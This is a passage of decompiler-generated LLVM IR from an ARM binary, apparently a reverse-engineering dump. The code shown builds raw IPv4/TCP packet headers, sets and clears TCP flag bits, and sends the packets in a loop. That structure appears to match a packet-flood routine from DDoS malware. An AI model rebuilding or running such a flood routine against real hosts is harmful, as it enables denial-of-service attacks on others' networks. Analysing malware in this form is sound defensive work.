  store i32 %v6_a210, i32* %r2.global-to-local, align 4
  %v5_a504 = call i32 @llvm.bswap.i32(i32 %v3_a4e8)
  store i32 %v5_a504, i32* %r3.global-to-local, align 4
  %v1_a508 = add i32 %v0_a4e8, 2
  %v2_a508 = inttoptr i32 %v1_a508 to i16*
  %v3_a508 = load i16, i16* %v2_a508, align 2
  %v4_a508 = zext i16 %v3_a508 to i32
  store i32 %v4_a508, i32* %r1.global-to-local, align 4
  store i32 %v1_a50c, i32* @r7, align 4
  %v0_a510 = load i32, i32* @lr, align 4
  %v1_a510 = trunc i32 %v0_a510 to i16
  %v2_a510 = load i32, i32* %ip.global-to-local, align 4
  %v3_a510 = add i32 %v2_a510, 14
  %v4_a510 = inttoptr i32 %v3_a510 to i16*
  store i16 %v1_a510, i16* %v4_a510, align 2
  %v0_a514 = load i32, i32* %r1.global-to-local, align 4
  %v1_a514 = trunc i32 %v0_a514 to i16
  %v2_a514 = load i32, i32* %ip.global-to-local, align 4
  %v3_a514 = add i32 %v2_a514, 12
  %v4_a514 = inttoptr i32 %v3_a514 to i16*
  store i16 %v1_a514, i16* %v4_a514, align 2
  %v0_a518 = load i32, i32* %r3.global-to-local, align 4
  %v1_a518 = load i32, i32* %ip.global-to-local, align 4
  %v2_a518 = add i32 %v1_a518, 8
  %v3_a518 = inttoptr i32 %v2_a518 to i32*
  store i32 %v0_a518, i32* %v3_a518, align 4
  %v0_a51c = load i32, i32* @r7, align 4
  store i32 %v0_a51c, i32* @r0, align 4
  %v0_a520 = call i32 @function_1182c()
  store i32 %v0_a520, i32* %r0.global-to-local, align 4
  store i32 %v2_a09c, i32* %r3.global-to-local, align 4
  %v2_a52c = load i32, i32* @r4, align 4
  %v5_a52c = mul i32 %v2_a52c, 4
  %v6_a52c = add i32 %v5_a52c, %v2_a09c
  %v7_a52c = inttoptr i32 %v6_a52c to i32*
  store i32 %v0_a520, i32* %v7_a52c, align 4
  %v3_a530 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a530, i32* %r2.global-to-local, align 4
  %v0_a534 = load i32, i32* %r3.global-to-local, align 4
  %v4_a534 = mul i32 %v3_a530, 4
  %v5_a534 = add i32 %v0_a534, %v4_a534
  %v6_a534 = inttoptr i32 %v5_a534 to i32*
  %v7_a534 = load i32, i32* %v6_a534, align 4
  store i32 %v7_a534, i32* @r4, align 4
  %v1_a538 = inttoptr i32 %v7_a534 to i8*
  %v2_a538 = load i8, i8* %v1_a538, align 1
  %tmp103 = urem i8 %v2_a538, 16
  %v1_a53c = zext i8 %tmp103 to i32
  %v1_a540 = or i32 %v1_a53c, 64
  store i32 %v1_a540, i32* %r3.global-to-local, align 4
  %v1_a544 = trunc i32 %v1_a540 to i8
  store i8 %v1_a544, i8* %v1_a538, align 1
  %v0_a548 = load i32, i32* @r4, align 4
  %v1_a548 = inttoptr i32 %v0_a548 to i8*
  %v2_a548 = load i8, i8* %v1_a548, align 1
  %v0_a54c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_a54c, 256
  %v1_a554 = and i8 %v2_a548, -16
  %v1_a558 = or i8 %v1_a554, 5
  %v1_a55c = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_a54c, 256
  %v4_a560 = urem i32 %tmp78, 256
  %v5_a560 = or i32 %v4_a560, %v1_a55c
  store i32 %v5_a560, i32* %r2.global-to-local, align 4
  %v0_a564 = load i32, i32* @fp, align 4
  %v1_a564 = urem i32 %v0_a564, 256
  store i32 %v1_a564, i32* %r0.global-to-local, align 4
  store i32 %v1_a11c, i32* %ip.global-to-local, align 4
  %v3_a56c = udiv i32 %v0_a564, 256
  store i32 %v3_a56c, i32* %r1.global-to-local, align 4
  store i8 %v1_a558, i8* %v1_a548, align 1
  %v0_a574 = load i32, i32* %r1.global-to-local, align 4
  %v1_a574 = load i32, i32* %r0.global-to-local, align 4
  %v4_a574 = mul i32 %v1_a574, 256
  %v5_a574 = or i32 %v4_a574, %v0_a574
  store i32 %v5_a574, i32* %r1.global-to-local, align 4
  store i32 %v6_a0b4, i32* %r0.global-to-local, align 4
  %v2_a57c = load i32, i32* @r4, align 4
  %v3_a57c = add i32 %v2_a57c, 1
  %v4_a57c = inttoptr i32 %v3_a57c to i8*
  store i8 %v5_a0d4, i8* %v4_a57c, align 1
  %v0_a580 = load i32, i32* %r1.global-to-local, align 4
  %v1_a580 = trunc i32 %v0_a580 to i16
  %v2_a580 = load i32, i32* @r4, align 4
  %v3_a580 = add i32 %v2_a580, 4
  %v4_a580 = inttoptr i32 %v3_a580 to i16*
  store i16 %v1_a580, i16* %v4_a580, align 2
  %v0_a584 = load i32, i32* %ip.global-to-local, align 4
  %v2_a584 = icmp eq i32 %v0_a584, 0
  store i1 %v2_a584, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a110, i32* %r1.global-to-local, align 4
  %v0_a58c = load i32, i32* %r2.global-to-local, align 4
  %v1_a58c = trunc i32 %v0_a58c to i16
  %v2_a58c = load i32, i32* @r4, align 4
  %v3_a58c = add i32 %v2_a58c, 2
  %v4_a58c = inttoptr i32 %v3_a58c to i16*
  store i16 %v1_a58c, i16* %v4_a58c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_a584, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_a4b0
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_a4b0, %bb79
  %v0_a598 = load i32, i32* %r1.global-to-local, align 4
  %v1_a598 = trunc i32 %v0_a598 to i8
  %v2_a598 = load i32, i32* @r4, align 4
  %v3_a598 = add i32 %v2_a598, 8
  %v4_a598 = inttoptr i32 %v3_a598 to i8*
  store i8 %v1_a598, i8* %v4_a598, align 1
  %v0_a59c = load i32, i32* %r3.global-to-local, align 4
  %v1_a59c = trunc i32 %v0_a59c to i8
  %v2_a59c = load i32, i32* @r4, align 4
  %v3_a59c = add i32 %v2_a59c, 9
  %v4_a59c = inttoptr i32 %v3_a59c to i8*
  store i8 %v1_a59c, i8* %v4_a59c, align 1
  %v0_a5a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a5a0, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_a5a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a5a0 = trunc i32 %v1_a5a0 to i16
  %v3_a5a0 = load i32, i32* @r4, align 4
  %v4_a5a0 = add i32 %v3_a5a0, 6
  %v5_a5a0 = inttoptr i32 %v4_a5a0 to i16*
  store i16 %v2_a5a0, i16* %v5_a5a0, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_20a4c.46 to i32), i32* %r2.global-to-local, align 4
  %v2_a5a8 = load i32, i32* @global_var_20a4c.46, align 4
  store i32 %v2_a5a8, i32* %r1.global-to-local, align 4
  %v1_a5ac = load i32, i32* @r4, align 4
  %v2_a5ac = add i32 %v1_a5ac, 12
  %v3_a5ac = inttoptr i32 %v2_a5ac to i32*
  store i32 %v2_a5a8, i32* %v3_a5ac, align 4
  %v3_a5b0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a5b0, i32* %r3.global-to-local, align 4
  store i32 %v2_a08c, i32* %ip.global-to-local, align 4
  %v4_a5b8 = mul i32 %v3_a5b0, 16
  %v5_a5b8 = add i32 %v4_a5b8, %v2_a08c
  %v6_a5b8 = inttoptr i32 %v5_a5b8 to i32*
  %v7_a5b8 = load i32, i32* %v6_a5b8, align 4
  store i32 %v7_a5b8, i32* %r2.global-to-local, align 4
  store i32 %v5_a5b8, i32* %r3.global-to-local, align 4
  %v1_a5c4 = load i32, i32* @r4, align 4
  %v2_a5c4 = add i32 %v1_a5c4, 16
  %v3_a5c4 = inttoptr i32 %v2_a5c4 to i32*
  store i32 %v7_a5b8, i32* %v3_a5c4, align 4
  %v0_a5c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5c8 = add i32 %v0_a5c8, 12
  %v2_a5c8 = inttoptr i32 %v1_a5c8 to i16*
  %v3_a5c8 = load i16, i16* %v2_a5c8, align 2
  %v4_a5c8 = zext i16 %v3_a5c8 to i32
  store i32 %v4_a5c8, i32* %r0.global-to-local, align 4
  %v1_a5cc = add i32 %v0_a5c8, 8
  %v2_a5cc = inttoptr i32 %v1_a5cc to i32*
  %v3_a5cc = load i32, i32* %v2_a5cc, align 4
  store i32 %v3_a5cc, i32* %r1.global-to-local, align 4
  %v2_a5d0 = load i32, i32* @r4, align 4
  %v3_a5d0 = add i32 %v2_a5d0, 20
  %v4_a5d0 = inttoptr i32 %v3_a5d0 to i16*
  store i16 %v3_a5c8, i16* %v4_a5d0, align 2
  %v0_a5d4 = load i32, i32* @r4, align 4
  %v1_a5d4 = add i32 %v0_a5d4, 20
  store i32 %v1_a5d4, i32* @r8, align 4
  %v1_a5d8 = add i32 %v0_a5d4, 33
  %v2_a5d8 = inttoptr i32 %v1_a5d8 to i8*
  %v3_a5d8 = load i8, i8* %v2_a5d8, align 1
  %v4_a5d8 = zext i8 %v3_a5d8 to i32
  store i32 %v4_a5d8, i32* %r2.global-to-local, align 4
  %v0_a5dc = load i32, i32* %r1.global-to-local, align 4
  %v2_a5dc = add i32 %v0_a5d4, 24
  %v3_a5dc = inttoptr i32 %v2_a5dc to i32*
  store i32 %v0_a5dc, i32* %v3_a5dc, align 4
  %v0_a5e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a5e0 = or i32 %v0_a5e0, 1
  store i32 %v1_a5e0, i32* %r2.global-to-local, align 4
  %v0_a5e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5e4 = add i32 %v0_a5e4, 4
  %v2_a5e4 = inttoptr i32 %v1_a5e4 to i32*
  %v3_a5e4 = load i32, i32* %v2_a5e4, align 4
  store i32 %v3_a5e4, i32* %r1.global-to-local, align 4
  %v1_a5e8 = add i32 %v0_a5e4, 14
  %v2_a5e8 = inttoptr i32 %v1_a5e8 to i16*
  %v3_a5e8 = load i16, i16* %v2_a5e8, align 2
  %v4_a5e8 = zext i16 %v3_a5e8 to i32
  store i32 %v4_a5e8, i32* %r3.global-to-local, align 4
  %v1_a5ec = trunc i32 %v1_a5e0 to i8
  %v2_a5ec = load i32, i32* @r8, align 4
  %v3_a5ec = add i32 %v2_a5ec, 13
  %v4_a5ec = inttoptr i32 %v3_a5ec to i8*
  store i8 %v1_a5ec, i8* %v4_a5ec, align 1
  %v0_a5f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5f0 = trunc i32 %v0_a5f0 to i16
  %v2_a5f0 = load i32, i32* @r8, align 4
  %v3_a5f0 = add i32 %v2_a5f0, 2
  %v4_a5f0 = inttoptr i32 %v3_a5f0 to i16*
  store i16 %v1_a5f0, i16* %v4_a5f0, align 2
  %v0_a5f4 = load i32, i32* @r8, align 4
  %v1_a5f4 = add i32 %v0_a5f4, 12
  %v2_a5f4 = inttoptr i32 %v1_a5f4 to i8*
  %v3_a5f4 = load i8, i8* %v2_a5f4, align 1
  %v4_a5f4 = zext i8 %v3_a5f4 to i32
  store i32 %v4_a5f4, i32* %r3.global-to-local, align 4
  %v1_a5f8 = add i32 %v0_a5f4, 13
  %v2_a5f8 = inttoptr i32 %v1_a5f8 to i8*
  %v3_a5f8 = load i8, i8* %v2_a5f8, align 1
  %v4_a5f8 = zext i8 %v3_a5f8 to i32
  %tmp104 = urem i8 %v3_a5f4, 16
  %v1_a5fc = zext i8 %tmp104 to i32
  %v1_a600 = or i32 %v1_a5fc, 128
  store i32 %v1_a600, i32* %r3.global-to-local, align 4
  %v1_a604 = or i32 %v4_a5f8, 16
  store i32 %v1_a604, i32* %r2.global-to-local, align 4
  %v0_a608 = load i32, i32* %r1.global-to-local, align 4
  %v2_a608 = add i32 %v0_a5f4, 8
  %v3_a608 = inttoptr i32 %v2_a608 to i32*
  store i32 %v0_a608, i32* %v3_a608, align 4
  %v0_a60c = load i32, i32* %r3.global-to-local, align 4
  %v1_a60c = trunc i32 %v0_a60c to i8
  %v2_a60c = load i32, i32* @r8, align 4
  %v3_a60c = add i32 %v2_a60c, 12
  %v4_a60c = inttoptr i32 %v3_a60c to i8*
  store i8 %v1_a60c, i8* %v4_a60c, align 1
  %v0_a610 = load i32, i32* %r2.global-to-local, align 4
  %v1_a610 = trunc i32 %v0_a610 to i8
  %v2_a610 = load i32, i32* @r8, align 4
  %v3_a610 = add i32 %v2_a610, 13
  %v4_a610 = inttoptr i32 %v3_a610 to i8*
  store i8 %v1_a610, i8* %v4_a610, align 1
  %v0_a614 = call i32 @function_e0b4()
  %v1_a614 = trunc i32 %v0_a614 to i16
  store i32 %v0_a614, i32* %r0.global-to-local, align 4
  store i32 %v1_a158, i32* %r1.global-to-local, align 4
  %v0_a61c = load i32, i32* @r8, align 4
  %v1_a61c = add i32 %v0_a61c, 13
  %v2_a61c = inttoptr i32 %v1_a61c to i8*
  %v3_a61c = load i8, i8* %v2_a61c, align 1
  %v4_a61c = zext i8 %v3_a61c to i32
  store i32 %v1_a620, i32* %r2.global-to-local, align 4
  %v1_a624 = and i32 %v4_a61c, 223
  %v5_a628 = or i32 %v1_a624, %v4_a628
  store i32 %v5_a628, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v5_a628 to i8
  store i8 %v1_a62c, i8* %v2_a61c, align 1
  store i32 %v1_a178, i32* %ip.global-to-local, align 4
  %v0_a634 = load i32, i32* @r8, align 4
  %v1_a634 = add i32 %v0_a634, 13
  %v2_a634 = inttoptr i32 %v1_a634 to i8*
  %v3_a634 = load i8, i8* %v2_a634, align 1
  %v4_a634 = zext i8 %v3_a634 to i32
  store i32 %v1_a638, i32* %r3.global-to-local, align 4
  %v1_a63c = and i32 %v4_a634, 239
  %v5_a640 = or i32 %v1_a63c, %v4_a640
  store i32 %v5_a640, i32* %r2.global-to-local, align 4
  %v1_a644 = trunc i32 %v5_a640 to i8
  store i8 %v1_a644, i8* %v2_a634, align 1
  store i32 %v1_a198, i32* %r1.global-to-local, align 4
  %v0_a64c = load i32, i32* @r8, align 4
  %v1_a64c = add i32 %v0_a64c, 13
  %v2_a64c = inttoptr i32 %v1_a64c to i8*
  %v3_a64c = load i8, i8* %v2_a64c, align 1
  %v4_a64c = zext i8 %v3_a64c to i32
  store i32 %v1_a650, i32* %r2.global-to-local, align 4
  %v1_a654 = and i32 %v4_a64c, 247
  %v5_a658 = or i32 %v1_a654, %v4_a658
  store i32 %v5_a658, i32* %r3.global-to-local, align 4
  %v1_a65c = trunc i32 %v5_a658 to i8
  store i8 %v1_a65c, i8* %v2_a64c, align 1
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a664 = load i32, i32* @r8, align 4
  %v1_a664 = add i32 %v0_a664, 13
  %v2_a664 = inttoptr i32 %v1_a664 to i8*
  %v3_a664 = load i8, i8* %v2_a664, align 1
  %v4_a664 = zext i8 %v3_a664 to i32
  store i32 %v1_a668, i32* %r3.global-to-local, align 4
  %v1_a66c = and i32 %v4_a664, 251
  %v5_a670 = or i32 %v1_a66c, %v4_a670
  store i32 %v5_a670, i32* %r2.global-to-local, align 4
  %v1_a674 = trunc i32 %v5_a670 to i8
  store i8 %v1_a674, i8* %v2_a664, align 1
  store i32 %v1_a1d8, i32* %r1.global-to-local, align 4
  %v0_a67c = load i32, i32* @r8, align 4
  %v1_a67c = add i32 %v0_a67c, 13
  %v2_a67c = inttoptr i32 %v1_a67c to i8*
  %v3_a67c = load i8, i8* %v2_a67c, align 1
  %v4_a67c = zext i8 %v3_a67c to i32
  store i32 %v1_a680, i32* %r2.global-to-local, align 4
  %v1_a684 = and i32 %v4_a67c, 253
  %v4_a688 = or i32 %v1_a684, %v3_a688
  store i32 %v4_a688, i32* %r3.global-to-local, align 4
  %v1_a68c = trunc i32 %v4_a688 to i8
  store i8 %v1_a68c, i8* %v2_a67c, align 1
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a694 = load i32, i32* @r8, align 4
  %v1_a694 = add i32 %v0_a694, 13
  %v2_a694 = inttoptr i32 %v1_a694 to i8*
  %v3_a694 = load i8, i8* %v2_a694, align 1
  %v4_a694 = zext i8 %v3_a694 to i32
  %v1_a69c = and i32 %v4_a694, 254
  store i32 %v1_a69c, i32* %r2.global-to-local, align 4
  %v2_a6a0 = or i32 %v1_a69c, %v1_a698
  store i32 %v2_a6a0, i32* %r3.global-to-local, align 4
  %v1_a6a4 = trunc i32 %v2_a6a0 to i8
  store i8 %v1_a6a4, i8* %v2_a694, align 1
  %v3_a6a8 = load i32, i32* @r8, align 4
  %v4_a6a8 = add i32 %v3_a6a8, 14
  %v5_a6a8 = inttoptr i32 %v4_a6a8 to i16*
  store i16 %v1_a614, i16* %v5_a6a8, align 2
  store i32 %v6_a210, i32* %r1.global-to-local, align 4
  %v0_a6b0 = load i32, i32* @r4, align 4
  %v1_a6b0 = add i32 %v0_a6b0, 40
  store i32 %v1_a6b0, i32* %r0.global-to-local, align 4
  %v2_a6b4 = inttoptr i32 %v1_a6b0 to i16*
  %v3_a6b4 = call i32 @function_e248(i16* %v2_a6b4, i32 %v6_a210)
  store i32 %v3_a6b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a408

dec_label_pc_a6bc:                                ; preds = %dec_label_pc_a27c
  store i32 %v6_a210, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_a210, 40
  br label %dec_label_pc_a6cc

dec_label_pc_a6cc:                                ; preds = %dec_label_pc_a41c, %dec_label_pc_a6bc
  %storemerge6.pre-phi = phi i32 [ %v1_a50c, %dec_label_pc_a41c ], [ %.pre, %dec_label_pc_a6bc ]
  %v0_a6e026 = phi i32 [ %v1_a410, %dec_label_pc_a41c ], [ 0, %dec_label_pc_a6bc ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_a210, 65536
  %storemerge = add i32 %v6_a210, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_a6cc = add i32 %storemerge4, 1310720
  store i32 %v1_a6cc, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_a6cc, 256
  %v3_a6d4 = and i32 %tmp83, 65280
  store i32 %v3_a6d4, i32* %r3.global-to-local, align 4
  %v4_a6d8 = udiv i32 %v1_a6cc, 16777216
  %v5_a6d8 = or i32 %v3_a6d4, %v4_a6d8
  store i32 %v5_a6d8, i32* @r8, align 4
  %v2_a804 = icmp eq i32 %v1_a230, 0
  br label %dec_label_pc_a6dc

dec_label_pc_a6dc:                                ; preds = %dec_label_pc_a6dc, %dec_label_pc_a7e8, %dec_label_pc_a6cc
  %v0_a6e0 = phi i32 [ %v0_a6e026, %dec_label_pc_a6cc ], [ 0, %dec_label_pc_a7e8 ], [ 0, %dec_label_pc_a6dc ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a6e0 = icmp eq i32 %v0_a6e0, 0
  store i1 %v2_a6e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a6e0, label %dec_label_pc_a6dc, label %dec_label_pc_a6ec

dec_label_pc_a6ec:                                ; preds = %dec_label_pc_a6dc, %dec_label_pc_a7e8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a6f0

dec_label_pc_a6f0:                                ; preds = %dec_label_pc_a718, %dec_label_pc_a6ec
  %v1_a6f8 = phi i32 [ %v1_a7d8, %dec_label_pc_a718 ], [ 0, %dec_label_pc_a6ec ]
  store i32 %v2_a09c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_a6f8 = mul i32 %v1_a6f8, 4
  %v5_a6f8 = add i32 %v4_a6f8, %v2_a09c
  %v6_a6f8 = inttoptr i32 %v5_a6f8 to i32*
  %v7_a6f8 = load i32, i32* %v6_a6f8, align 4
  store i32 %v7_a6f8, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a700 = load i32, i32* @fp, align 4
  %v9_a700 = icmp eq i32 %v0_a700, 65535
  store i1 %v9_a700, i1* %cpsr_z.global-to-local, align 1
  %v1_a704 = add i32 %v7_a6f8, 20
  store i32 %v1_a704, i32* @r5, align 4
  br i1 %v9_a700, label %dec_label_pc_a7fc, label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a6f0
  store i32 %v1_a230, i32* %r3.global-to-local, align 4
  store i1 %v2_a804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a804, label %dec_label_pc_a718, label %dec_label_pc_a810

dec_label_pc_a718:                                ; preds = %dec_label_pc_a70c, %dec_label_pc_a7fc, %dec_label_pc_a810
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a71c = load i32, i32* @r4, align 4
  %v3_a71c = add i32 %v2_a71c, 10
  %v4_a71c = inttoptr i32 %v3_a71c to i16*
  store i16 0, i16* %v4_a71c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a724 = load i32, i32* @r4, align 4
  store i32 %v0_a724, i32* @r0, align 4
  %v2_a728 = call i32 @function_c848(i32 %v0_a724, i32 20)
  %v3_a728 = trunc i32 %v2_a728 to i16
  store i32 %v2_a728, i32* %r0.global-to-local, align 4
  %v3_a72c = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_a08c, i32* %r2.global-to-local, align 4
  %v3_a734 = mul i32 %v3_a72c, 16
  %v2_a738 = add i32 %v3_a734, %v2_a08c
  store i32 %v2_a738, i32* %r1.global-to-local, align 4
  %v1_a73c = add i32 %v2_a738, 4
  %v2_a73c = inttoptr i32 %v1_a73c to i32*
  %v3_a73c = load i32, i32* %v2_a73c, align 4
  %v3_a740 = mul i32 %v3_a73c, 65536
  store i32 %v3_a740, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_a73c, 256
  %v1_a748 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_a73c, 256
  %v4_a74c = urem i32 %tmp86, 256
  %v5_a74c = or i32 %v4_a74c, %v1_a748
  store i32 %v5_a74c, i32* %r3.global-to-local, align 4
  %v1_a750 = add i32 %v3_a73c, 1
  store i32 %v1_a750, i32* %r2.global-to-local, align 4
  store i32 %v1_a750, i32* %v2_a73c, align 4
  %v0_a758 = load i32, i32* %r3.global-to-local, align 4
  %v1_a758 = load i32, i32* @r5, align 4
  %v2_a758 = add i32 %v1_a758, 4
  %v3_a758 = inttoptr i32 %v2_a758 to i32*
  store i32 %v0_a758, i32* %v3_a758, align 4
  %v0_a75c = load i32, i32* %r1.global-to-local, align 4
  %v1_a75c = add i32 %v0_a75c, 8
  %v2_a75c = inttoptr i32 %v1_a75c to i32*
  %v3_a75c = load i32, i32* %v2_a75c, align 4
  %tmp87 = mul i32 %v3_a75c, 256
  %v1_a768 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_a75c, 256
  %v4_a76c = urem i32 %tmp88, 256
  %v5_a76c = or i32 %v4_a76c, %v1_a768
  %v1_a770 = load i32, i32* @r5, align 4
  %v2_a770 = add i32 %v1_a770, 8
  %v3_a770 = inttoptr i32 %v2_a770 to i32*
  store i32 %v5_a76c, i32* %v3_a770, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a778 = load i32, i32* @r4, align 4
  %v4_a778 = add i32 %v3_a778, 10
  %v5_a778 = inttoptr i32 %v4_a778 to i16*
  store i16 %v3_a728, i16* %v5_a778, align 2
  %v0_a77c = load i32, i32* @r5, align 4
  store i32 %v0_a77c, i32* @r1, align 4
  %v0_a780 = load i32, i32* %r3.global-to-local, align 4
  %v1_a780 = trunc i32 %v0_a780 to i16
  %v3_a780 = add i32 %v0_a77c, 16
  %v4_a780 = inttoptr i32 %v3_a780 to i16*
  store i16 %v1_a780, i16* %v4_a780, align 2
  %v0_a784 = load i32, i32* @r8, align 4
  store i32 %v0_a784, i32* %r2.global-to-local, align 4
  %v0_a788 = load i32, i32* @sl, align 4
  store i32 %v0_a788, i32* %r3.global-to-local, align 4
  %v0_a78c = load i32, i32* @r4, align 4
  store i32 %v0_a78c, i32* %r0.global-to-local, align 4
  %v4_a790 = call i32 @function_c898(i32 %v0_a78c, i32 %v0_a77c, i32 %v0_a784, i32 %v0_a788)
  %v5_a790 = trunc i32 %v4_a790 to i16
  store i32 %v4_a790, i32* %r0.global-to-local, align 4
  %v3_a794 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a794, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a79c = mul i32 %v3_a794, 32
  store i32 %v3_a79c, i32* %lr.global-to-local, align 4
  %v3_a7a0 = load i32, i32* @r5, align 4
  %v4_a7a0 = add i32 %v3_a7a0, 16
  %v5_a7a0 = inttoptr i32 %v4_a7a0 to i16*
  store i16 %v5_a790, i16* %v5_a7a0, align 2
  %v0_a7a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_a7a4 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_a7a4, -8
  %v5_a7a4 = add i32 %v0_a7a4, %tmp105
  store i32 %v5_a7a4, i32* %lr.global-to-local, align 4
  %v0_a7a8 = load i32, i32* @r5, align 4
  %v1_a7a8 = add i32 %v0_a7a8, 2
  %v2_a7a8 = inttoptr i32 %v1_a7a8 to i16*
  %v3_a7a8 = load i16, i16* %v2_a7a8, align 2
  %v1_a7ac = load i32, i32* %ip.global-to-local, align 4
  %v2_a7ac = add i32 %v1_a7ac, %v5_a7a4
  store i32 %v2_a7ac, i32* @lr, align 4
  %v3_a7b0 = add i32 %v2_a7ac, 2
  %v4_a7b0 = inttoptr i32 %v3_a7b0 to i16*
  store i16 %v3_a7a8, i16* %v4_a7b0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a7bc = load i32, i32* @r4, align 4
  store i32 %v0_a7bc, i32* %r1.global-to-local, align 4
  %v0_a7c0 = load i32, i32* @sb, align 4
  store i32 %v0_a7c0, i32* %r0.global-to-local, align 4
  %v0_a7c4 = load i32, i32* @r7, align 4
  store i32 %v0_a7c4, i32* %r2.global-to-local, align 4
  %v0_a7c8 = load i32, i32* @lr, align 4
  %v6_a7d0 = call i32 @function_11560(i32 %v0_a7c0, i32 %v0_a7bc, i32 %v0_a7c4, i32 16384, i32 %v0_a7c8, i32 16)
  %v3_a7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a7d4, i32* %r3.global-to-local, align 4
  %v1_a7d8 = add i32 %v3_a7d4, 1
  store i32 %v1_a7d8, i32* %r0.global-to-local, align 4
  %v0_a7dc = load i32, i32* @r6, align 4
  %v9_a7dc = icmp eq i32 %v0_a7dc, %v1_a7d8
  store i1 %v9_a7dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a7d8, i32* %stack_var_-44, align 4
  %v8_a7e4 = icmp sgt i32 %v0_a7dc, %v1_a7d8
  br i1 %v8_a7e4, label %dec_label_pc_a6f0, label %dec_label_pc_a7e8

dec_label_pc_a7e8:                                ; preds = %dec_label_pc_a718
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a7ec = icmp eq i32 %v0_a7dc, 0
  store i1 %v2_a7ec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a7ec, label %dec_label_pc_a6dc, label %dec_label_pc_a6ec

dec_label_pc_a7fc:                                ; preds = %dec_label_pc_a6f0
  %v0_a7fc = call i32 @function_e0b4()
  %v1_a7fc = trunc i32 %v0_a7fc to i16
  store i32 %v0_a7fc, i32* %r0.global-to-local, align 4
  store i32 %v1_a230, i32* %r3.global-to-local, align 4
  store i1 %v2_a804, i1* %cpsr_z.global-to-local, align 1
  %v3_a808 = load i32, i32* @r4, align 4
  %v4_a808 = add i32 %v3_a808, 4
  %v5_a808 = inttoptr i32 %v4_a808 to i16*
  store i16 %v1_a7fc, i16* %v5_a808, align 2
  br i1 %v2_a804, label %dec_label_pc_a718, label %dec_label_pc_a7fc.dec_label_pc_a810_crit_edge

dec_label_pc_a7fc.dec_label_pc_a810_crit_edge:    ; preds = %dec_label_pc_a7fc
  %v0_a810.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a810

dec_label_pc_a810:                                ; preds = %dec_label_pc_a7fc.dec_label_pc_a810_crit_edge, %dec_label_pc_a70c
  %v0_a810 = phi i32 [ %v0_a810.pre, %dec_label_pc_a7fc.dec_label_pc_a810_crit_edge ], [ %v7_a6f8, %dec_label_pc_a70c ]
  %v1_a810 = add i32 %v0_a810, 40
  store i32 %v1_a810, i32* %r0.global-to-local, align 4
  store i32 %v6_a210, i32* %r1.global-to-local, align 4
  %v2_a818 = inttoptr i32 %v1_a810 to i16*
  %v3_a818 = call i32 @function_e248(i16* %v2_a818, i32 %v6_a210)
  store i32 %v3_a818, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a718

; uselistorder directives
  uselistorder i32 %v0_a7fc, { 1, 0 }
  uselistorder i32 %v1_a7d8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a7a4, { 1, 0 }
  uselistorder i32 %v4_a790, { 1, 0 }
  uselistorder i32 %v3_a75c, { 1, 0 }
  uselistorder i32 %v3_a73c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_a728, { 1, 0 }
  uselistorder i1 %v2_a804, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a614, { 1, 0 }
  uselistorder i32 %v0_a54c, { 1, 0 }
  uselistorder i32 %v5_a4e0, { 1, 0 }
  uselistorder i32 %v0_a4a0, { 1, 0 }
  uselistorder i32 %v0_a45c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a40c, { 1, 0, 2, 3 }
